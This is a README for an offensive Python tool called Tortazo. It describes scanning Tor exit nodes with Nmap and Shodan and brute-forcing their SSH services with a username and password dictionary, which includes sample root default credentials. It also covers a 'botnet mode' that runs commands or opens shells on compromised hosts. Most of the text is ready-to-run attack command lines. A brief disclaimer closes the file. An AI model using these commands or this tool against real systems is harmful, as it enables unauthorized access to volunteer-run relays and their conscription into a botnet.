# Tortazo

Stem is a powerful library written in Python to perform various operations against TOR Clients and Directory Authorities. The information gathered using Stem could be very useful to an attacker to gather information about the relays available in the TOR network

Tortazo is an open source Python Script to gather information about ExitNodes in the TOR Network, perform bruteforce attacks against services like FTP or SSH and create a Botnet with the compromised ExitNodes over SSH.

* **Use Shodan** - Using a valid Shodan Key, you can gather information about an ExitNode stored in the Shodan Database.
* **Use Nmap** - Using python-nmap, Tortazo is able to perform NMap scans against a list of ExitNodes

## Dependencies
To use the script, you'll need the following dependencies:

* Paramiko:         https://github.com/paramiko/paramiko
* Python-Nmap       http://xael.org/norman/python/python-nmap/
* Python-shodan:    https://github.com/achillean/shodan-python
* Stem:             https://stem.torproject.org/
* Plumbum:          https://pypi.python.org/pypi/plumbum
* Fabric:           http://docs.fabfile.org/en/1.8/
* Requests:         https://pypi.python.org/pypi/requests

   

## Examples
*All examples assume you have already setup the dependencies!*

##Gather Information
The examples below, will generate a file named "nmapScan.txt" with the nmap scan results for every single Exit Node in the Directory Authorities or in the local TOR Client storage. (Depending on the options used).
I put various combinations to explain how to use the script and the effect of use some options.
On other hand, is much, much faster to use the local descriptors than to connect with the directory authorities (directly or using mirrors, both connection types are very slow sometimes) also depending on the number of users connected, sometimes the servers are busy and the connections with the directory authorities will fail or will be unstable. Anyways, you can use any method to gather information, but the fact is that the directory authorities always have a lot of information about new relays available and the local descriptors have a short set of exit nodes. So... choose your weapon!

*KEEP IN MIND:*
- In the new versions of the TOR Client, by default the microdescriptors will be downloaded to compose the circuits. This is good because the circuit construction is much faster, but the information about the relays is very limited. So, if you plan to gather information using the TOR Client, you need to set the "UseMicrodescriptors" option to "0" in your torrc file.
- If you want to use the TOR Client to gather information, you need to open the Control Port to use the Stem Controller (and set a password for security issues) to connect with the local instance and get the server descriptors. Please, check your torrc file.
- The connections with the TOR Authorities could be slow and sometimes unstable.
- You can use all the features included in Nmap (including NSE Scripts) using the option "-a/--scan-arguments"
- If you want to use Shodan, you'll need a valid developer key. That value should be written into a file in a single line and use the options "--use-shodan" and "--shodan-key"
- The bruteforce mode needs a dictionary to perform the attack against the open ports
- In botnet mode, Tortazo will not perform connections against TOR (neither local or remote)

*Show the available Options*
```
python Tortazo.py -h
```

*Connect to the TOR Authorities using the mirrors servers (-d)
*Enable the "verbose" mode (-v)
*Scan ExitNodes which operative system is Windows (-m windows)*

Short opts:
```
python Tortazo.py -d -v -m windows
```

Long opts:
```
python Tortazo.py --use-mirrors --verbose --mode windows
```

*Connect to the TOR Authorities directly
*Enable the "verbose" mode (-v)
*Scan ExitNodes which operative system is Linux (-m linux)*

Short opts:
```
python Tortazo.py -d -v -m linux
```

Long opts:
```
python Tortazo.py --use-mirrors --verbose --mode linux
```

*Connect to the Directory Authorities directly
*Enable the "verbose" mode (-v)
*Scan ExitNodes which operative system is Linux (-m linux)*

Short opts:
```
python Tortazo.py -v -m linux
```

Long opts:
```
python Tortazo.py --verbose --mode windows
```

*Connect to the TOR Authorities directly
*Enable the "verbose" mode (-v)
*Scan ExitNodes which operative system is Linux (-m linux)
*Just recover the first 30 nodes from the list of exit nodes found (this value by default is very short: 10)*

Short opts:
```
python Tortazo.py -n 30 -v -m linux
```

Long opts:
```
python Tortazo.py --servers-to-attack 30 --verbose --mode linux
```

*Connect to the TOR Authorities directly
*Enable the "verbose" mode (-v)
*Scan ExitNodes which operative system is Linux (-m linux)
*Just recover the first 30 nodes from the list of exit nodes found (this value by default is very short: 10)
*Create 10 threads to process the list of exit nodes which match with the criteria specified*

Short opts:
```
python Tortazo.py -t 10 -n 30 -v -m linux
```

Long opts:
```
python Tortazo.py --threads 10 --servers-to-attack 30 --verbose --mode linux
```

*Connect to the TOR Authorities directly
*Enable the "verbose" mode (-v)
*Scan ExitNodes which operative system is Linux (-m linux)
*Just recover the first 30 nodes from the list of exit nodes found (this value by default is very short: 10)
*Create 10 threads to process the list of exit nodes which match with the criteria specified
*Perform the Nmap scan with the specified options "-sSV -A -n"*

Short opts:
```
python Tortazo.py -t 10 -n 30 -v -m linux -a "-sSV -A -n"
```

Long opts:
```
python Tortazo.py --threads 10 --servers-to-attack 30 --verbose --mode linux --scan-arguments "-sSV -A -n"
```


*Connect to the Local instance of TOR and use the ExitNodes stored in the local descriptors.
*Enable the "verbose" mode (-v)
*Scan ExitNodes which operative system is Linux (-m linux)*


Short opts:
```
python Tortazo.py -v -m linux -c
```

Long opts:
```
python Tortazo.py --verbose --mode linux --use-circuit-nodes
```

*Connect to the TOR Authorities directly
*Enable the "verbose" mode (-v)
*Scan ExitNodes which operative system is Linux (-m linux)
*Just recover the first 30 nodes from the list of exit nodes found (this value by default is very short: 10)
*Create 10 threads to process the list of exit nodes which match with the criteria specified
*Perform the Nmap scan with the specified options "-sSV -A -n"
*Filter by FingerPrint*

Short opts:
```
python Tortazo.py -t 10 -n 30 -v -m linux -a "-sSV -A -n" -e FFAC0F4C85052F696EBB9517DD6E2E8B830835DD
```

Long opts:
```
python Tortazo.py --threads 10 --servers-to-attack 30 --verbose --mode linux --scan-arguments "-sSV -A -n" --exit-node-fingerprint FFAC0F4C85052F696EBB9517DD6E2E8B830835DD
```

Tortazo v1.0 Supports Shodan and Nmap for Information Gathering and profiling the targets. However, in Tortazo v1.1, support for Nessus, Metasploit and other tools will be integrated.


##Brute Force Attacks.
In addition to gathering information on potential targets, Tortazo, allows you to specify a dictionary of usernames and passwords for bruteforce attacks. However, in case that it is not specified, the tool uses some of the users and passwords files contained in FuzzDB project. (obviously, this process is very slow and loud)
The version of FuzzDB used by Tortazo is 1.09 (the lastest version in time of writing this) and is just used for read some files for bruteforce attacks. In future versions, is very probable to use another patterns contained in FuzzDB.
On other hand, the dictionary file must contain the usernames and passwords separated by colon and just one pair combination for each line in the file.
Tortazo v1.0 just supports bruteforcing on SSH services running in the ExitNodes of TOR (Using Paramiko). However in future releases another protocols and libraries will be added


*Connect to the TOR Authorities directly
*Enable the "verbose" mode (-v)
*Scan ExitNodes which operative system is Linux (-m linux)
*Just recover the first 30 nodes from the list of exit nodes found (this value by default is very short: 10)
*Create 10 threads to process the list of exit nodes which match with the criteria specified
*Perform the Nmap scan with the specified options "-sSV -A -n"
*Filter by FingerPrint*
*Perform Bruteforce attack against the targets using dict. file

Short opts:
```
python Tortazo.py -t 10 -n 30 -v -m linux -a "-sSV -A -n" -e FFAC0F4C85052F696EBB9517DD6E2E8B830835DD -b /home/user/dictFile.txt
```

Long opts:
```
python Tortazo.py --threads 10 --servers-to-attack 30 --verbose --mode linux --scan-arguments "-sSV -A -n" --exit-node-fingerprint FFAC0F4C85052F696EBB9517DD6E2E8B830835DD
```

where "/home/user/dictFile.txt" could have the following contents:

```
root:password
root:root
root:s3cr3t
root:toor
root:passwd
root:admin123
```

*Connect to the TOR Authorities directly
*Enable the "verbose" mode (-v)
*Scan ExitNodes which operative system is Linux (-m linux)
*Just recover the first 30 nodes from the list of exit nodes found (this value by default is very short: 10)
*Create 10 threads to process the list of exit nodes which match with the criteria specified
*Perform the Nmap scan with the specified options "-sSV -A -n"
*Filter by FingerPrint*
*Perform Bruteforce attack using FuzzDB (very slow and loud)

Short opts:
```
python Tortazo.py -t 10 -n 30 -v -m linux -a "-sSV -A -n" -e FFAC0F4C85052F696EBB9517DD6E2E8B830835DD -b
```

Long opts:
```
python Tortazo.py --threads 10 --servers-to-attack 30 --verbose --mode linux --scan-arguments "-sSV -A -n" --brute-force
```

##Botnet mode.
The botnet mode is specified with the option -z/--zombie and depends on the tortazo_botnet.bot file. In this mode, Tortazo will read that file and then, tries to perform SSH Connections using the hosts and credentials defined in the file.
Every line in "tortazo_botnet.bot" have the next format:

    host:user:passwd:port:nickname

Fabric (python library) is used to connect with the SSH servers and perform commands.
When you specify the -z/--zombie option, tortazo will not download or parse descriptors from Tor authorities, just reads the tortazo_botnet.bot file and then tries to open a shell on the specified bot (when -o/--open-shell is specified) or run a command (when -r/--run-command is specified)
In this mode, you must specify the nicknames that will be excluded from the botnet (comma separated) or "all" to include all  bots from tortazo_botnet.bot file.

Short opts:
```
python Tortazo.py -v -t 10 -z all -r "id; uname -a; uptime; w"
```

Long opts:
```
python Tortazo.py --verbose --threads 10 --zombie-mode all --run-command "id; uname -a; uptime; w"
```

If you want to open a new shell, just use the -o/--open-shell option

Short opts:
```
python Tortazo.py -v -t 10 -z all -o
```

Long opts:
```
python Tortazo.py --verbose --threads 10 --zombie-mode all --open-shell
```

NOTE: Obviously, the credentials in the tortazo_botnet.bot file should be valid for every host. If the credentials are not valid, Fabric will resolve the authentication method (password or public key) and will require that you enter the password or passphase depending on the authentication method.

##Some Screenshots!!

![Searching in the Mirrors](https://github.com/Adastra-thw/Tortazo/blob/master/screenshots/simpleMirrors.png "Searching in the Mirrors")
![Simple Command Execution using the tortazo_botnet.bot](https://github.com/Adastra-thw/Tortazo/blob/master/screenshots/botNet.png "Simple Command Execution using the tortazo_botnet.bot")
![Simple Command Execution using the tortazo_botnet.bot](https://github.com/Adastra-thw/Tortazo/blob/master/screenshots/botNet.png "Simple Command Execution using the tortazo_botnet.bot")
![Selecting a shell from tortazo_botnet.bot](https://github.com/Adastra-thw/Tortazo/blob/master/screenshots/botNetOpenShell1.png "Selecting a shell from tortazo_botnet.bot")
![Opening a shell on the selected host](https://github.com/Adastra-thw/Tortazo/blob/master/screenshots/botNetOpenShell2.png "Opening a shell on the selected host")

##Legal Warning!!
I've developed this tool to improve my knowledge about TOR and Python. I'm a security enthusiast and I hope that you use this tool with responsibility, but if that is not the case, I'm not responsible for the use (or misuse) of this tool.
If you found vulnerabilities or any kind of flaw in any Exit Node of TOR Network, please, send the report to the admin, in this way you can contribute to build solid and secure TOR circuits for all of us.

##Contact
If you find any bug, please write me to debiadastra@gmail.com
If you want to contribute to develop this little tool, I'll be glad to hear of you.


Thanks for reading.